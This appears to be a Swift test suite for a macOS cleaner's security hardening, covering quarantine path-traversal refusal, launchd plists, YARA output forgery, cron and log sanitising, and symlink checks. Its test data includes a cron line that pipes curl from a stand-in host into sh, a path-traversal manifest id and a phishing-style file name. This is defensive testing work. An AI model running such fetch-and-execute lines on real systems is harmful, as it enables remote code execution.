import Foundation
import Testing
@testable import VibeCleanerCore

/// Fixes of the security and validation reviews (Protection, quarantine, YARA, cron, SQLite, logs, CLI helpers).
/// Everything runs in a temporary folder; root scripts run unprivileged with `launchctl` replaced by `/usr/bin/true`.
@Suite struct ProtectionHardeningTests {
    let fm = FileManager.default
    let tmp: URL

    init() throws {
        let t = fm.temporaryDirectory.appendingPathComponent("vc-f2-\(UUID().uuidString)")
        try fm.createDirectory(at: t, withIntermediateDirectories: true)
        tmp = t.path.hasPrefix("/var/") ? URL(fileURLWithPath: "/private" + t.path) : t
    }

    @discardableResult
    func file(_ rel: String, _ text: String = "x") throws -> URL {
        let url = tmp.appendingPathComponent(rel)
        try fm.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data(text.utf8).write(to: url)
        return url
    }

    func sh(_ command: [String]) -> Int32 { Shell.run(command[0], Array(command.dropFirst())).status }

    // MARK: Quarantine manifest (V2-B2)

    @Test func listIgnoresAManifestNamingAnotherFolder() throws {
        let q = Quarantine(root: tmp.appendingPathComponent("Q"))
        let forged = q.root.appendingPathComponent(UUID().uuidString)
        try fm.createDirectory(at: forged, withIntermediateDirectories: true)
        let e = Quarantine.Entry(id: "../../../Messages", originalPath: "/tmp/setup.pkg", reason: "", date: Date())
        try JSONEncoder().encode(e).write(to: forged.appendingPathComponent("manifest.json"))
        let other = q.root.appendingPathComponent("not-a-uuid")
        try fm.createDirectory(at: other, withIntermediateDirectories: true)
        try JSONEncoder().encode(Quarantine.Entry(id: "not-a-uuid", originalPath: "/tmp/a", reason: "", date: Date()))
            .write(to: other.appendingPathComponent("manifest.json"))
        #expect(q.list().isEmpty)
        #expect(throws: (any Error).self) { try q.purge("not-a-uuid") }
        #expect(fm.fileExists(atPath: other.path))
    }

    func forgedEntry(_ q: Quarantine, original: String) throws -> String {
        let id = UUID().uuidString
        let dir = q.root.appendingPathComponent(id)
        try fm.createDirectory(at: dir.appendingPathComponent("payload"), withIntermediateDirectories: true)
        try Data("attacker".utf8).write(to: dir.appendingPathComponent("payload").appendingPathComponent(URL(fileURLWithPath: original).lastPathComponent))
        try JSONEncoder().encode(Quarantine.Entry(id: id, originalPath: original, reason: "", date: Date())).write(to: dir.appendingPathComponent("manifest.json"))
        return id
    }

    @Test func restoreRefusesForgedDestinations() throws {
        let home = tmp.appendingPathComponent("home")
        let q = Quarantine(root: tmp.appendingPathComponent("Q"))
        let remover = SafeRemover(home: home.path)
        for original in [home.path + "/Library/Safari/History.db", home.path + "/Library/Containers/x/Data/a", "relative/a",
                         home.path + "/a/../Library/Mail/x", "/System/Library/x", home.path] {
            let id = try forgedEntry(q, original: original)
            #expect(throws: (any Error).self, "\(original)") { try q.restore(id, remover: remover) }
            #expect(fm.fileExists(atPath: q.root.appendingPathComponent(id).path))
        }
        #expect(!fm.fileExists(atPath: home.appendingPathComponent("Library").path), "un dossier protégé a été créé")
        // Mail attachments stay restorable.
        let mail = home.path + "/Library/Containers/com.apple.mail/Data/Library/Mail Downloads/A/f.pdf"
        try q.restore(try forgedEntry(q, original: mail), remover: remover)
        #expect(fm.fileExists(atPath: mail))
    }

    @Test func restoreOfAnEmptyEntryDoesNotCreateTheParent() throws {
        let q = Quarantine(root: tmp.appendingPathComponent("Q"))
        let id = UUID().uuidString
        let dir = q.root.appendingPathComponent(id)
        try fm.createDirectory(at: dir, withIntermediateDirectories: true)
        let original = tmp.appendingPathComponent("gone/parent/x.plist")
        try JSONEncoder().encode(Quarantine.Entry(id: id, originalPath: original.path, reason: "", date: Date())).write(to: dir.appendingPathComponent("manifest.json"))
        #expect(throws: (any Error).self) { try q.restore(id) }
        #expect(!fm.fileExists(atPath: tmp.appendingPathComponent("gone").path))
    }

    @Test func restoreAndPurgeHonourSimulation() throws {
        let q = Quarantine(root: tmp.appendingPathComponent("Q"))
        let f = try file("a.bin")
        let e = try q.add(f, reason: "")
        try q.restore(e.id, remover: SafeRemover(dryRun: true))
        try q.purge(e.id, remover: SafeRemover(dryRun: true))
        #expect(!fm.fileExists(atPath: f.path))
        #expect(q.list().map(\.id) == [e.id])
    }

    // MARK: Root zone (V2-C2, V4 restore)

    @Test func launchdDomains() {
        #expect(Quarantine.launchdDomain("/Library/LaunchDaemons/a.plist") == "system")
        #expect(Quarantine.launchdDomain("/Library/LaunchAgents/a.plist", uid: 501) == "gui/501")
        #expect(Quarantine.launchdDomain("/Users/me/Library/LaunchAgents/a.plist") == nil)
    }

    @Test func adminScriptsMoveIntoAFreshFolderAndBack() throws {
        let zone = tmp.appendingPathComponent("zone/Quarantine")
        let q = Quarantine(root: tmp.appendingPathComponent("Q"), adminRoot: zone)
        let plist = try file("LaunchDaemons/com.evil.plist", "plist")
        let id = UUID().uuidString
        #expect(sh(try q.adminAddCommand(plist, id: id, domain: "system", launchctl: "/usr/bin/true")) == 0)
        #expect(!fm.fileExists(atPath: plist.path))
        #expect(fm.fileExists(atPath: zone.appendingPathComponent("\(id)/com.evil.plist").path))
        // The same id twice: mkdir refuses an existing folder.
        let again = try file("LaunchDaemons/com.evil.plist", "second")
        #expect(sh(try q.adminAddCommand(again, id: id, domain: nil, launchctl: "/usr/bin/true")) != 0)
        #expect(fm.fileExists(atPath: again.path))
        try fm.removeItem(at: again)

        let e = try q.recordAdmin(id: id, originalPath: plist.path, reason: "r")
        #expect(q.list().first?.admin == true)
        let restore = try q.adminRestoreCommand(e, ownerUID: getuid(), launchctl: "/usr/bin/true")
        #expect(sh(restore) == 0)
        #expect(try String(contentsOf: plist, encoding: .utf8) == "plist")
        // Destination back in place: a second restore refuses to overwrite it.
        #expect(sh(restore) != 0)
    }

    @Test func adminRestoreRefusesAParentOwnedBySomeoneElse() throws {
        let zone = tmp.appendingPathComponent("zone")
        let q = Quarantine(root: tmp.appendingPathComponent("Q"), adminRoot: zone)
        let plist = try file("LaunchDaemons/a.plist")
        let id = UUID().uuidString
        #expect(sh(try q.adminAddCommand(plist, id: id, domain: nil, launchctl: "/usr/bin/true")) == 0)
        let e = try q.recordAdmin(id: id, originalPath: plist.path, reason: "")
        // Production accepts only root-owned ancestors; the temporary folders belong to the test user.
        #expect(sh(try q.adminRestoreCommand(e, ownerUID: 0, launchctl: "/usr/bin/true")) != 0)
        #expect(!fm.fileExists(atPath: plist.path))
    }

    @Test func adminAddRefusesAZoneReplacedByALink() throws {
        let target = tmp.appendingPathComponent("LaunchAgents")
        try fm.createDirectory(at: target, withIntermediateDirectories: true)
        let zone = tmp.appendingPathComponent("zone")
        try fm.createSymbolicLink(at: zone, withDestinationURL: target)
        let q = Quarantine(root: tmp.appendingPathComponent("Q"), adminRoot: zone)
        let plist = try file("LaunchDaemons/a.plist")
        #expect(sh(try q.adminAddCommand(plist, id: UUID().uuidString, domain: nil, launchctl: "/usr/bin/true")) != 0)
        #expect(fm.fileExists(atPath: plist.path))
        #expect(try fm.contentsOfDirectory(atPath: target.path).isEmpty)
    }

    @Test func adminPurgeScriptRemovesOnlyItsEntry() throws {
        let zone = tmp.appendingPathComponent("zone")
        let id = UUID().uuidString
        try file("zone/\(id)/a.plist")
        try file("zone/keep/b.plist")
        #expect(sh(["/bin/sh", "-c", Quarantine.adminPurgeScript, "sh", zone.path, id]) == 0)
        #expect(!fm.fileExists(atPath: zone.appendingPathComponent(id).path))
        #expect(fm.fileExists(atPath: zone.appendingPathComponent("keep/b.plist").path))
    }

    // MARK: Persistence

    func plist(_ rel: String, program: String) throws -> URL {
        let url = tmp.appendingPathComponent(rel)
        try fm.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        let data = try PropertyListSerialization.data(fromPropertyList: ["Label": url.deletingPathExtension().lastPathComponent,
                                                                         "ProgramArguments": ["/bin/sh", program]], format: .xml, options: 0)
        try data.write(to: url)
        return url
    }

    @Test func appleNamedPlistsAreNotSkippedOnTheirName() throws {
        let p = try plist("LaunchAgents/com.apple.update.plist", program: tmp.appendingPathComponent(".hidden/run.sh").path)
        #expect(ProtectionModule.launchItem(p, system: false) != nil)
    }

    @Test func theProgramOfAnAgentGoesToQuarantineToo() throws {
        let script = try file(".hidden/run.sh", "#!/bin/sh")
        let p = try plist("LaunchAgents/com.evil.plist", program: script.path)
        #expect(ProtectionModule.quarantinableProgram(of: p, remover: SafeRemover(home: tmp.path))?.path == script.path)
        let system = try plist("LaunchAgents/com.sys.plist", program: "/usr/bin/true")
        #expect(ProtectionModule.quarantinableProgram(of: system, remover: SafeRemover(home: tmp.path)) == nil)
        let missing = try plist("LaunchAgents/com.gone.plist", program: tmp.appendingPathComponent("nope").path)
        #expect(ProtectionModule.quarantinableProgram(of: missing, remover: SafeRemover(home: tmp.path)) == nil)
    }

    @Test func processesInPromptingFoldersAreNeverOpenedWithoutFullDiskAccess() {
        let home = tmp
        let list: [(pid: Int32, path: String)] = [(10, home.appendingPathComponent("Documents/dev/.build/tool").path),
                                                  (11, home.appendingPathComponent("Downloads/x").path)]
        var checked: [String] = []
        let g = Processes.group(list, context: ModuleContext(home: home), excludedTeamIDs: [],
                                blocked: FullDiskAccess.promptingFolders(home: home)) { u in
            checked.append(u.path); return SignatureInfo(status: .unsigned, teamID: nil, isApple: false, isNotarized: false)
        }
        #expect(checked.isEmpty)
        #expect(g.items.isEmpty)
    }

    @Test func noFullDiskAccessByDefaultAndProbeOnATemporaryHome() {
        #expect(ProtectionModule().fullDiskAccess == false)
        #expect(ProtectionModule().scanArchives == false)
        #expect(ProtectionModule().scanDiskImages == false)
        #expect(FullDiskAccess.isGranted(home: tmp.path) == FullDiskAccess.isGranted(home: tmp.path))
    }

    // MARK: Scan modes

    @Test func scanModesFollowTheSpec() throws {
        let home = tmp.appendingPathComponent("home")
        for d in ["Downloads", "Library/Application Support", "Library/Preferences", "Library/Caches", "Library/Fonts",
                  "Library/Mobile Documents", "Library/Mail", "Applications", "Documents"] {
            try fm.createDirectory(at: home.appendingPathComponent(d), withIntermediateDirectories: true)
        }
        func targets(_ depth: ProtectionModule.ScanDepth, fda: Bool) -> Set<String> {
            var m = ProtectionModule(depth: depth)
            m.fullDiskAccess = fda
            return Set(m.yaraTargets(context: ModuleContext(home: home)).map(\.path))
        }
        let quick = targets(.quick, fda: true)
        #expect(quick.contains(home.appendingPathComponent("Library/Application Support").path))
        #expect(quick.contains(home.appendingPathComponent("Downloads").path))
        #expect(!quick.contains(home.appendingPathComponent("Library/Fonts").path))
        let balanced = targets(.balanced, fda: true)
        #expect(balanced.contains(home.appendingPathComponent("Library/Fonts").path))
        #expect(balanced.contains(home.appendingPathComponent("Applications").path))
        #expect(!balanced.contains(home.appendingPathComponent("Library/Caches").path))
        #expect(!balanced.contains(home.appendingPathComponent("Library/Preferences").path))
        let deep = targets(.deep, fda: true)
        #expect(deep.contains(home.appendingPathComponent("Library/Caches").path))
        #expect(deep.contains(home.appendingPathComponent("Documents").path))
        #expect(!deep.contains(home.appendingPathComponent("Library/Mobile Documents").path), "un dossier iCloud serait téléchargé")
        let blocked = targets(.deep, fda: false)
        for d in ["Downloads", "Documents", "Library/Mail"] { #expect(!blocked.contains(home.appendingPathComponent(d).path), "\(d)") }
        #expect(blocked.contains(home.appendingPathComponent("Library/Fonts").path))
    }

    // MARK: YARA output (V2-C1)

    @Test func yaraLinesForgedByAFileNameAreDropped() throws {
        let root = tmp.appendingPathComponent("Shared")
        let evil = try file("Shared/evil.bin")
        let victim = try file("Shared/victim.txt")
        let fake = try file("bin/yara", """
        #!/bin/sh
        for a in "$@"; do last="$a"; done
        if [ -d "$last" ]; then
          printf 'EVIL_RULE %s\\nEVIL_RULE %s\\nEVIL_RULE /etc/hosts\\n' "\(evil.path)" "\(victim.path)"
          i=0; while [ $i -lt 3000 ]; do echo "warning: flood flood flood flood flood flood flood" >&2; i=$((i+1)); done
        else
          case "$last" in *evil.bin) echo "EVIL_RULE $last" ;; esac
        fi
        """)
        try fm.setAttributes([.posixPermissions: 0o755], ofItemAtPath: fake.path)
        let scan = FileScan(yara: fake.path, rules: "/dev/null", hashes: HashList(text: ""), expandPKG: false, expandArchives: false)
        let hits = scan.direct([root], isCancelled: { false })
        #expect(hits.map(\.path) == [evil.path])
    }

    @Test func watchedToolsNeitherBlockOnStderrNorRunForever() {
        let out = FileScan.capture("/bin/sh", ["-c", "i=0; while [ $i -lt 20000 ]; do echo xxxxxxxxxxxxxxxx >&2; i=$((i+1)); done; echo ok"],
                                   timeout: 30, abort: { false })
        #expect(out == "ok\n")
        let start = Date()
        #expect(FileScan.runWatched("/bin/sleep", ["10"], capture: false, timeout: 0.5, abort: { false }) == nil)
        #expect(Date().timeIntervalSince(start) < 5)
        #expect(FileScan.runWatched("/bin/sleep", ["10"], capture: false, timeout: 60, abort: { true }) == nil)
    }

    @Test func expansionLimitsCountFilesAndBytes() throws {
        let dir = tmp.appendingPathComponent("many")
        try fm.createDirectory(at: dir, withIntermediateDirectories: true)
        #expect(!FileScan.exceedsLimits(dir))
        for i in 0...FileScan.maxArchive.files { try Data().write(to: dir.appendingPathComponent("\(i)")) }
        #expect(FileScan.exceedsLimits(dir))
    }

    // MARK: Cron (V2-C7), logs (V2-M3), notifications (V2-M4), tccutil (V2-M7)

    @Test func cronRemovalWorksOnCRLFLines() {
        let line = "* * * * * curl -s http://x.example/p | sh"
        let tab = "# m h\r\n\(line)\r\n0 1 * * * /usr/bin/true\r\n"
        #expect(Cron.entries(tab).map(\.line) == [line])
        let rest = Cron.removing(line, from: tab)
        #expect(!Cron.contains(line, in: rest))
        #expect(Cron.contains("0 1 * * * /usr/bin/true", in: rest))
        #expect(Cron.excerpt("0 1 * * * curl -H \"Authorization: Bearer secret-token\" http://x | sh").hasSuffix("…"))
        #expect(!Cron.excerpt(String(repeating: "a", count: 100)).contains("\n"))
    }

    @Test func logLinesCannotBeForged() {
        #expect(LogFile.oneLine("a\nb\rc\u{2028}d") == "a␤b␤c␤d")
        #expect(!LogFile.oneLine("x\u{1B}[31m").contains("\u{1B}"))
        #expect(LogFile.oneLine("été 🙂") == "été 🙂")
    }

    @Test func threatNotificationsNeutralizeTheFileName() {
        let name = "Entrez votre mot de passe\nsur http://phish.example pour continuer, sinon votre Mac sera bloqué définitivement"
        let safe = ThreatNotice.safeName(name)
        #expect(!safe.contains("\n"))
        #expect(safe.count <= 61)
        let body = ThreatNotice.body([ResultItem(id: "a", name: name, detail: "Règle X — /chemin", action: .none)])
        #expect(!body.contains("/chemin"))
    }

    @Test func tccClientsMustBeBundleIDs() {
        #expect(Privacy.isToken("com.example.App-2_x"))
        for bad in ["", "-a", "a b", "/usr/bin/x", "a;b", "a\nb", "é.app"] { #expect(!Privacy.isToken(bad), "\(bad)") }
    }

    // MARK: SQLite (V2-M2)

    @Test func rowsRefuseADatabaseThatIsALink() throws {
        let target = try file("real.db", "")
        let link = tmp.appendingPathComponent("History")
        try fm.createSymbolicLink(at: link, withDestinationURL: target)
        #expect(SQLite.rows(link, "SELECT 1") == nil)
        #expect(throws: (any Error).self) { try SQLite.execute(link, "SELECT 1;") }
    }

    // MARK: Browsers

    @Test func firefoxProfilesIniAndChromeChannels() {
        let base = URL(fileURLWithPath: "/ff")
        let ini = "[General]\nStartWithLastProfile=1\n\n[Profile0]\nName=a\nIsRelative=1\nPath=Profiles/abc.default\n\n[Profile1]\nIsRelative=0\nPath=/Volumes/X/ff\n"
        #expect(Browsers.firefoxProfiles(ini: ini, base: base).map(\.path) == ["/ff/Profiles/abc.default", "/Volumes/X/ff"])
        let ids = Set(Browsers.chromium.map(\.bundleID))
        for id in ["com.google.Chrome.beta", "com.google.Chrome.dev", "com.google.Chrome.canary", "com.operasoftware.Opera"] { #expect(ids.contains(id)) }
    }

    // MARK: Stop (V4)

    @Test func executeStopsWhenCancelled() async throws {
        let f = try file("Downloads/evil.command")
        let q = Quarantine(root: tmp.appendingPathComponent("Q"))
        let item = ResultItem(id: "f", name: "f", url: f, action: .custom("quarantine-file"))
        let ctx = ModuleContext(home: tmp)
        let task = Task { [q, item, ctx] in
            withUnsafeCurrentTask { $0?.cancel() }
            return await ProtectionModule(quarantine: q).execute([item], context: ctx)
        }
        let r = await task.value
        #expect(r.failures.map(\.reason) == [ExecutionProgress.stoppedReason])
        #expect(fm.fileExists(atPath: f.path))
    }

    // MARK: Cloud and Radar

    @Test func cloudServiceNameOfADashFolder() {
        #expect(CloudModule.serviceName("-") == "-")
        #expect(CloudModule.serviceName("-x") == "-x")
    }

    @Test func cloudSyncedPaths() {
        let h = tmp.path
        #expect(SpaceNode.isCloudSynced(path: h + "/Library/CloudStorage/GoogleDrive-a/f.mov", home: h))
        #expect(SpaceNode.isCloudSynced(path: h + "/Library/Mobile Documents/com~apple~CloudDocs/f", home: h))
        #expect(!SpaceNode.isCloudSynced(path: h + "/Movies/f.mov", home: h))
    }
}
